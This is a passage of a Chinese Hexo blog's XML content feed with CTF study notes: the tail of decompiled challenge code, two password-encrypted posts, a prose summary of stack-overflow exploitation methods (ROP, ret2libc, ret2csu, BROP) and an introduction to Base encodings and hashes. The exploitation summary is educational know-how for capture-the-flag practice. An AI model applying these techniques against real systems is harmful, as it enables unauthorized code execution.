class="keyword">break</span>;</span><br><span class="line">            nptr[v7] = v8;</span><br><span class="line">            v7 = ++v6;</span><br><span class="line">            <span class="keyword">if</span> ( v5 &lt;= v6 )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">          v7 = v6 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;savedregs, nptr, v7);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_24:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bad choice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dlclose(handle);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exiting.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过代码发现是程序本身就执行了<code>memcpy(&amp;saveregs, nptr, v8);</code>。saveregs是IDA的关键字，保存的实际上是函数的栈帧指针RBP和返回地址。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫学习</title>
      <link href="/2022/04/08/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/08/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="c621b4bf34170afbb0db6a9399e56623ad1733db7fba9410a558e8b6559be704">f9570151bb09e3fee6d1a340574bfec6d1d480d1c58164b39bea0dad947980a72c1104c13ad867e00270e47db617ce9e406b173451992a4a74ddaca59349dcd3d75f80459b4441cbfef744bb4824e4d8ac02e50cf22926f4511fbf099df84f222a44a2276785cb390611ef64217ba18a79dfb2c735b0a528a836f2505bb18855dfbcc716c901ca84cba1f39f74be1883fcf324da492b48c9744214db4baa88e120b76af19a1c7f90f24be8c31eb84f7683664f45182b7a5b38f4ae11adfe0489c1ab8b6560ed6427bd4725072ab217d79d6585821aa728994012077c7a1722eb07ac10f39fd5ac4b73421f3840415d5b5eb361709a28f3839a9b65865560fa87f96b733055e380a6f1b8cf9cdde28ab72c75204cec000e66f045fd9ca7a76933f8e59bffff5c6b1d68ebce394f46b477e80029276e753274d2a8b0723a906ac7856a4d6e51e7ccffa285765106f9744836ca2d0bfdc2ea9f05a75905bdd689c61e0330bbdd04f065b0966b5950517242d286d8c29ceabad54d0e5bed8997ca31b21ad011ff4ef62a83416603fbc875962e545e955478c719f9d760b885fab9df680092798ba70c917b8722d42fef91a7d22c1f277bdcd1eee24dc5550924285190d8ed5b747e39aea5b8b2287d96d7b7b2119c8493c65e35a59532b7dbdd2d5a03db7da4d7a59a7a9ec60fd763e74532eedb0561eff9643e3789830e3dcd23b90d2131f3da00a79457c9e927cb0997bcb615c1f3e97dc1f10862e7c4069c84f8fb76aad6fca73896579704f96c85d5c45a7db9e3ce019f82ed78a66ecb57ef8142b212aea0533bebffe131c24e35cac9fb2712c5fc7320a4a6276c8ed4ff14ddbbbbed8842049ea087072955e7cbf19d6e5aec432ae44c034a1ea000ecbd598f173d803e5ef053b2eb4eb743b3563b4c2683d4e53644fc2bf81318e2fa83322b3cc5dc53616e3c84678ad2a725eef7a72970bb166843205762bc158d13583eeb8c1350b525f4ea8b4038c7ecfa467b38fdcffd31026731850aeee3d249ebd28f3fcf1480c5b9511bba51330b31b8372ed0fb39475b8557f1f9e260cb21820b7a2c9477d57c576f71ba17cf63510e704108475700cbf889cbdfadec65a6f206e4d9dcadbe43453d96224ad0fe7512f7980a824d0d40ec7c8e76b8f2a43cf5e1142ce72b8fb41b52f6135f1ade6ab22486fd3d2ab6b9209db1b64dbf0380f8272373b16e1ea1e4841a9850a055e972083a26c5017ca13f48aa2bc9b9fd28e2cf907a463454a29c588210a752dee43d7b0b9686d7056516594a2ae2ad5cb1bff683f394ae0dbc62460ddde56132c198562f9746a86e933cf807f8908598e1ac2a4e4ed8c55aea669dede7bb67fb179797a84eb56cfabbec43eafed2376eb00e0cdee2ac8cf264d60ecc698092f175c04557bbfceff9c497959389e24e8c955a2c67d34b91dc7ac65110312bbc56f5ec6e624986c8e364817903d9317e40b99e887a7bc7e15035983178e243eaf45f50580d57106abe9bdc25a48d81e596d00f7f98</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅学pwn的笔记</title>
      <link href="/2022/04/06/%E6%B5%85%E5%AD%A6pwn%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/06/%E6%B5%85%E5%AD%A6pwn%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2d5b2beafb6227d3a419de9b0fb83db38c0cc4d94b1353623a13ca007ce20c7e">f9570151bb09e3fee6d1a340574bfec6d1d480d1c58164b39bea0dad947980a72c1104c13ad867e00270e47db617ce9e406b173451992a4a74ddaca59349dcd3d75f80459b4441cbfef744bb4824e4d8ac02e50cf22926f4511fbf099df84f222a44a2276785cb390611ef64217ba18a79dfb2c735b0a528a836f2505bb18855dfbcc716c901ca84cba1f39f74be1883fcf324da492b48c9744214db4baa88e120b76af19a1c7f90f24be8c31eb84f7683664f45182b7a5b38f4ae11adfe0489c1ab8b6560ed6427bd4725072ab217d72142c783aa6b616f7993ab7ad07d5addbe93095e9bea1a939d160890d5ead5593ba1f28a6e711920c831f3d0957ee0e5a912745f8749421073a7006e184e4d3ae770aae79f5beab5801ff0fefc767502eaa1ce9ca6e76b34b5fc841499d617e769ef442a5adf3bfb30b92d79c57f48de53ac8c1e60df06ad9e69589bebfb2f326eff991dddd53c5354693ea2721d4639952bb44f3a4dbee21b10849b8fc57f2905b61ae9f69e7ba1e66919e1d3c98ffcd5fd2829592f51ba6b07d1c91efcaba4b6b00fb0bb98d500f573d39c8f3468965371042e5c6d4d7c8f19afbd34c8d4d3e04842f3061b0758115d4ca745853a108376bb9d8947c05d82d01ec8ad318d6d426d59b827c17cd1b9f7b709b1a6977804e46797fc0541e0558a783b917905ba2989895b94fa2b30a7dc58b233aac5eb74d97e745e059e0ddb6f2ff957be0d01a66a8842de27deb5fd1595eac2f3b51fd694a770629baa65c4d4f4342c50f1e1fd86e277b99fb293a17c22c21e4e3fb61602900bd586a3e45f26463f41f97f786048ed1dee015aece635ea9e8067e248499c7d693107654f981c3828d38ce700acb550f72d320690a37586c7419f50f594803c5616f219886c1de94158335edb839839a838dd7d61b5e8a604c5f24f3af23a25684d61ee9a100eda0b60f7ad4d9f80090626100e762787d1cf36e8edf6e2d496f340cbc38547f49a168ec16cb7bfb10ab44c9d6014be598422ed1650bcad703b588a40c6d6dae04d741ac1ae079920967c123438899adb398abda224ab897517f64bacda96724bf81a9fd0d5f238309a8b781353f76f9ecb3c61f1a70e1a4844a748a386102fccfb2190da0e0d81cc6094aaee0480d25456e86f66c0af6ed80b6021777438c450e32efcbfda4ac2bcb47e5d4dfc6b9dd94dac743667170341f439d1a08680e0335d88ff603211254fd1530675784940e370217b215f31897af562a2553853faf6d19e602998c349f39518352ace3a6ff3c7b6ac36e75d6f7576a851632d0df4c01e331a07f4033f3df6d80e684fe74ca6c4b874c2d0a36238401945249986611545db39c415fe33ad740987a771d2ebf9c706eb5526d41476b8564f223c63f671fa6c16165d3514fb7107e27732955d7e315003161ed9f41350d402d03c99dc997d0124ff745255fd7d3c0e993a9e8acad2a975e2c6432ddb9b461668e269e1e887e7f2cd017b63bedbbc8f84b44ea250dbd707059f68de0f5b169f1c0a2eabdd1d3da1a315a40174e90f79698d3472b497c35f4d022edfabb7156cd40f9ffe33f51e9292c6ed33c0944cccdb3d2dc8422741361aee21631643721b74bc3e0421b2d3a6efd0e5abd7c7be55df8c522ce1e8e58c385dd697c81515d1118452baf28032212adc68cb6b9298465846892b87d7e1e8898b360a382f9e724e2f957c4d272ba305419be5c961fa5060c044361acd5c0da3703e8bf1e1e740ce3b23b684af591a3b77963bb6d6237bf0653bd22a3d80fdeead4a2f0f5345f2c3bdc874e12c52de3974809e68dbe91cb316bb57fd9906f0d42d64fae1773fb4b6c1a5d8551d0a7fc694c763ec0d47251fa2aafc715b9523207c7c8f39d90bf076d2bc930a30acfed1b9dc25e5ac61a283d140f44e7770d46d7e260aa1e4746d4c3a456c36fb230d202c28233091313b90359c69e79e40e3561ed5e994252c89d30e3cc9a244b357d16608e32cd244d0ef7a8510f65c75fcf33dc2c7126866ca3ed982a7709e5be9595be71b31375b5d0e9a0cd50f87f1fc6e20feaed8c1eb5d2e9a5e7ee8c29e8a279dc4e1a15ccd12aeec1df874c3910407f616239adfa3dc13ac9d7ed31460304e5a40e668ce59710c936aeef1f5c490b51c99fa4a737f1f1401ffbe381106754c617943623dfec753ab073c2c87000e2d81838af246d00598d6563ef5f4598630b210f301cb52637d6bfeb6400bfe8b37bdbf0f0645a97fa0a662756e3049879509d776c43cf3bb230311f87835394f7aed0bac01c17599c347e4c5934e237a235855eb7d599cb055f62e281955a89df27edaa314ca1963c783b36d388c36f107290be982fdbcbcf6d652ad75d3023aa0867368a7637c25e4605b91da360bca9fcc62ebc2d9b85733f954573dcd6b3b9376bef67cc8e5008d677deedad9c443a4cbe12e9c1bec0dfc4b136cffcde09d76137ac0ffb97834664f301ab72b8eff9b47c86116c9376a0888f3caca832be88edef63ea1967216d4e30bab0d4ab675097d334802ea4b29c0a86cf0878d56eeac5506d4b8cce9624ad32cd8b1a5cbeb82cd0deb2226dae7b8294fe8110de8982d8cf694de57da287a731fd9f37a389c24d8baa1434947a6c2987d6f5d254f9ccb2e88e140285c39363d613ff04875bfaff3986408d82cbc9e4a36c0ba92d6f50e40c892882ed396576908301a5c80950ef2424885af7aecfc273f35bdbe98723465ce64a8a17e74c0b5282a727b80d2ba7a52ad2cec84a7eee04133dea97875dda2abf1552692a637eb8d4d3a7fc7de02996be4ffb646424596c1a512fe59dfa1592210cbed4e69fbe2c2fdbf476db362959674776bb1eaebce07a039f96f83e0f58324302313aa29f9336348818c4a16dff80b4eb4fb09c40ca1a86492c7212ffdc112debf02035dc71a66d2b741856e7b1f553e03bf478f870b021517eb7ee86d8078d0e387eef721e436f49eedd3e2a094587bb4898a01f8514bc6a5801a77c2c475f57b2f8cdbfd0623a337bafd9fa994949d68ac77a68282460500945c11337c3353a56a0792ff983c8fde7ffdcc17cbe841e8b73310ab5fad1573e55b6a1eeee159f5e3e1be4a53033900b9539793350c049ab22a52f65ce2cdf84b538d52a2fbb08001187168774b4fdd8d2c7fa64988bc67ee723edf3a1967eeacd98814771980b943721ee22784995022df77953ddecf31de42cbf22f6fc2d611cdd58772729d14ee394ba791f37227318809dff8d398f5048f5e2ce702d28bd3ad2c6fc0304ac4afafb043cf9c93fa9341b4a129fe23fc5aa5c38411c79f8b46ab729884ebb9bc3e28cffc4921e5d38c6caab7c79f7b4291da72e9b7f5e91187c77154f4e1e053f96328815cf4fed7f7474de2622a126667cd39ad1754d5a68127a0a20346b9b38add725b8909635a84aa25fc9c2bb1d1627fd3e43f4e832008e55240b47624c302904cfd79ab9846d335b2c9c127e5b7952c8640f068131a6ac05197f046e49794450885a73f932f173184bca50dad1768d97342e3ff5ef975f3659e16757241d930106e37b4b774430eed392cc725c435eabded6b03413c4d8208fb128597b4b2cebee0b5f23e333fa81810c4d38f7011592ca921cd68ef741c32d7b5310707843155b280be0788f7a14e73c5ceef9d8b2106674618a7e401fc7a08a6d39ddbab9da68685c69b13a7baf5721a483586a3754015c65caadf0e20bee2a71d7afabb8f3b84875704fb9e9447893576314d8db33060aa6b83c4a92f32ea0cb14b2c2188f022c17786080ccc79c891761bd3a7b6614cf43df2cefe5cb41fd2d7f11353807ae34af35e9118666ca3972dcf2ed746290da3e33d4bb3aa0202bd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Overflow</title>
      <link href="/2022/04/03/Stack%20Overflow/"/>
      <url>/2022/04/03/Stack%20Overflow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>参考: <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow</a></p><h2 id="栈溢出原理-¶"><a href="#栈溢出原理-¶" class="headerlink" title="栈溢出原理[¶]"></a>栈溢出原理[¶]</h2><blockquote><p>程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p></blockquote><p>发生栈溢出的基本前提是</p><blockquote><ul><li><p>程序必须向栈上写入数据。</p></li><li><p>写入的数据大小没有被良好地控制。</p></li></ul></blockquote><p>利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><h2 id="ret2text-¶"><a href="#ret2text-¶" class="headerlink" title="ret2text[¶]"></a>ret2text[¶]</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="ret2shellcode-¶"><a href="#ret2shellcode-¶" class="headerlink" title="ret2shellcode[¶]"></a>ret2shellcode[¶]</h2><p>控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell.一般来说，shellcode 需要我们自己填充。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h2 id="ret2syscall-¶"><a href="#ret2syscall-¶" class="headerlink" title="ret2syscall[¶]"></a>ret2syscall[¶]</h2><p>控制程序执行系统调用，获取 shell。</p><h2 id="ret2libc-¶"><a href="#ret2libc-¶" class="headerlink" title="ret2libc [¶]"></a>ret2libc [¶]</h2><p>即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><h2 id="ret2csu-¶"><a href="#ret2csu-¶" class="headerlink" title="ret2csu[¶]"></a>ret2csu[¶]</h2><blockquote><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p></blockquote><p>基本利用思路如下</p><ul><li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址(为了泄露信息，构造ROP来让程序执行write函数，打印出libc库函数地址，进而获取libc加载的基地址)，并使得程序重新执行 main 函数</li><li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li><li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li><li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。</li></ul><h2 id="ret2reg-¶"><a href="#ret2reg-¶" class="headerlink" title="ret2reg[¶]"></a>ret2reg[¶]</h2><p>攻击绕过地址混淆(ASLR)，返回到寄存器地址。</p><blockquote><p>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</p><p>然后反编译二进制，查找call reg 或者jmp reg指令，将EIP设置为该指令地址</p><p>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</p></blockquote><h2 id="BROP-¶"><a href="#BROP-¶" class="headerlink" title="BROP[¶]"></a>BROP[¶]</h2><p>是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。</p><h4 id="基本思路-¶"><a href="#基本思路-¶" class="headerlink" title="基本思路 [¶]"></a>基本思路 [¶]</h4><p>在 BROP 中，基本的遵循的思路如下</p><ul><li><p>判断栈溢出长度</p><ul><li><p>暴力枚举</p><blockquote><p>直接从 1 暴力枚举即可，直到发现程序崩溃。</p></blockquote></li></ul></li><li><p>Stack Reading</p><ul><li>获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。</li></ul></li><li><p>Blind ROP</p><ul><li><p>找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。</p><blockquote><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>最朴素的执行 write 函数的方法就是构造系统调用。</p></blockquote></li></ul></li><li><p>Build the exploit</p><ul><li>利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Stack Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto基础</title>
      <link href="/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Base系列编码"><a href="#1-Base系列编码" class="headerlink" title="1.Base系列编码"></a>1.Base系列编码</h2><h3 id="Base-16"><a href="#Base-16" class="headerlink" title="Base 16"></a>Base 16</h3><p>使用16个ASCII可打印字符<strong>（数字0-9和字母A-F）</strong>，对任意字节数据进行编码。</p><p>先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制。</p><img src="/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/image-20220118110059544.png" style="zoom:25%;"><h3 id="Base-32"><a href="#Base-32" class="headerlink" title="Base 32"></a>Base 32</h3><p>Base32编码是使用32个可打印字符<strong>（字母A-Z和数字2-7）</strong>对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符。“=”符号用作后缀填充。</p><p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p><img src="/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/image-20220118110204305.png" style="zoom:25%;"><h3 id="Base-36"><a href="#Base-36" class="headerlink" title="Base 36"></a>Base 36</h3><p>Base36是一个二进制到文本编码表示方案的二进制数据以ASCII通过将其转化为一个字符串格式基数 -36表示。以**(0-9、A-Z)**表示数字。</p><p>有符号的32位和64位整数分别最多只能容纳6个或13个base-36位数字（许多base-36位数字可能会使32位和64位整数溢出）。</p><p>例如，在base-36中，“ 922337203685477575807 ” 的64位带符号整数最大值为“ 1Y2P0IJ32E8E7 ”。类似地，在base-36中，“ 2147483647 ” 的32位带符号整数最大值为“ ZIK0ZJ ”。</p><h3 id="Base-58"><a href="#Base-58" class="headerlink" title="Base 58"></a>Base 58</h3><p>相比Base64，<strong>Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/“符号</strong>。</p><img src="/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/image-20220118155613582.png" style="zoom:25%;"><h3 id="Base-64"><a href="#Base-64" class="headerlink" title="Base 64"></a>Base 64</h3><p>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。</p><p>在Base64中的可打印字符包括<strong>字母A-Z、a-z、数字0-9</strong>，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法。“=”符号用作后缀填充。</p><img src="/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/image-20220118110602272.png" style="zoom: 25%;"><p>当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；</p><p>如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。</p><p>参考下表：<img src="/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/image-20220118110830131.png" style="zoom:25%;"></p><h3 id="Base-85"><a href="#Base-85" class="headerlink" title="Base 85"></a>Base 85</h3><img src="/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/image-20220118111126810.png" style="zoom:25%;"><h3 id="Base-91"><a href="#Base-91" class="headerlink" title="Base 91"></a>Base 91</h3><p>base91的密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()+,./:;&lt;=&gt;?@[]^_`{|}~”）组成</p><h3 id="Base-100"><a href="#Base-100" class="headerlink" title="Base 100"></a>Base 100</h3><p>可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。</p><p>举例：</p><blockquote><p>明文：hello，world.123456</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base16: 68656C6C6F2C776F726C642E313233343635</span><br><span class="line">特征：大写字母(A-Z)和数字(0-9)，不用‘=’补齐。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base32: NBSWY3DPFR3W64TMMQXDCMRTGQ3DK===</span><br><span class="line">特征：大写字母(A-Z)和数字(2-7)，不满5的倍数，用‘=’补齐。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64: aGVsbG8sd29ybGQuMTIzNDY1</span><br><span class="line">特征：大小写字母（A-Z，a-z）和数字（0-9）以及特殊字符‘+’，‘/’，不满3的倍数，用‘=’补齐。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base58: 2smDFYXWKE8vc8XA8dadEYcSqcQb</span><br><span class="line">特征：相比Base64，Base58不使用数字&quot;0&quot;，字母大写&quot;O&quot;，字母大写&quot;I&quot;，和字母小写&quot;l&quot;，以及&quot;+&quot;和&quot;/&quot;符号，最主要的是后面不会出现&#x27;=&#x27;。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base85: BOu!rDst&gt;tGAhM&lt;A1fSl1GgsI</span><br><span class="line">特征：特点是奇怪的字符比较多，但是很难出现等号</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world.123456</span><br><span class="line">base91: TPwJh&gt;go2Tv!_,aRA2IbLmA</span><br><span class="line">特征：由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;~”）组成</span><br><span class="line">不支持中文。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base100: 👟👜👣👣👦📦💳💃👮👦👩👣👛🐥🐨🐩🐪🐫🐬🐭</span><br><span class="line">特征：就是一堆Emoji表情</span><br></pre></td></tr></table></figure><h2 id="2-MD5"><a href="#2-MD5" class="headerlink" title="2.MD5"></a>2.MD5</h2><p>一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，字母大小写统一。16位值是取的是8~24位。</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.123456</span><br><span class="line">md5(hello，world.123456,32) = 5189503aae1b1c0a6fbf7ea9e3128ab0</span><br><span class="line">md5(hello，world.123456,16) = ae1b1c0a6fbf7ea9</span><br></pre></td></tr></table></figure><p><a href="http://www.ttmd5.com/">md5解密1</a></p><p><a href="https://www.cmd5.com/">md5解密2</a></p><h2 id="3-SHA-1"><a href="#3-SHA-1" class="headerlink" title="3.SHA 1"></a>3.SHA 1</h2><p> SHA1是一种密码散列函数，SHA1可以生成一个被称为消息摘要的160位，20字节的散列值，散列值通常的呈现形式为<strong>40位十六进制数</strong>。这种加密和MD5类似。</p><p> <strong>特征：</strong> 有固定长度，为40位的字符串</p><p><strong>举例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.123456</span><br><span class="line">sha1（hello，world.123456）= 0179303b8f08fbc3d16cd23a4be5828790e12375</span><br></pre></td></tr></table></figure><p><a href="http://www.ttmd5.com/hash.php?type=5">sha1在线解密</a></p><h2 id="4-Unicode编码"><a href="#4-Unicode编码" class="headerlink" title="4.Unicode编码"></a>4.Unicode编码</h2><p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。<br>它用两个字节来编码一个字符,字符编码一般用十六进制来表示.</p><p> <strong>举例：</strong></p><p>Unicode有以下四种编码方式：</p><blockquote><p>明文：hello，world.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x [hex]：&amp;#x0068;&amp;#x0065;&amp;#x006C;&amp;#x006C;&amp;#x006F;&amp;#xFF0C;&amp;#x0077;&amp;#x006F;&amp;#x0072;&amp;#x006C;&amp;#x0064;&amp;#x002E;</span><br><span class="line"></span><br><span class="line">&amp;# [hex]：&amp;#00104;&amp;#00101;&amp;#00108;&amp;#00108;&amp;#00111;&amp;#65292;&amp;#00119;&amp;#00111;&amp;#00114;&amp;#00108;&amp;#00100;&amp;#00046;</span><br><span class="line"></span><br><span class="line">\u [hex]：\U0068\U0065\U006C\U006C\U006F\U002C\U0077\U006F\U0072\U006C\U0064\U002E</span><br><span class="line"></span><br><span class="line">\u+ [hex]：\U+0068\U+0065\U+006C\U+006C\U+006F\U+FF0C\U+0077\U+006F\U+0072\U+006C\U+0064\U+002E</span><br></pre></td></tr></table></figure><p><a href="http://www.mxcz.net/tools/Unicode.aspx">Unicode在线 </a></p><h2 id="5-HTML实体编码"><a href="#5-HTML实体编码" class="headerlink" title="5.HTML实体编码"></a>5.HTML实体编码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.</span><br><span class="line">十进制：&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;&amp;#65292;&amp;#119;&amp;#111;&amp;#114;&amp;#108;&amp;#100;&amp;#46;</span><br><span class="line">十六进制：&amp;#x68;&amp;#x65;&amp;#x6C;&amp;#x6C;&amp;#x6F;&amp;#xFF0C;&amp;#x77;&amp;#x6F;&amp;#x72;&amp;#x6C;&amp;#x64;&amp;#x2E;</span><br></pre></td></tr></table></figure><p><a 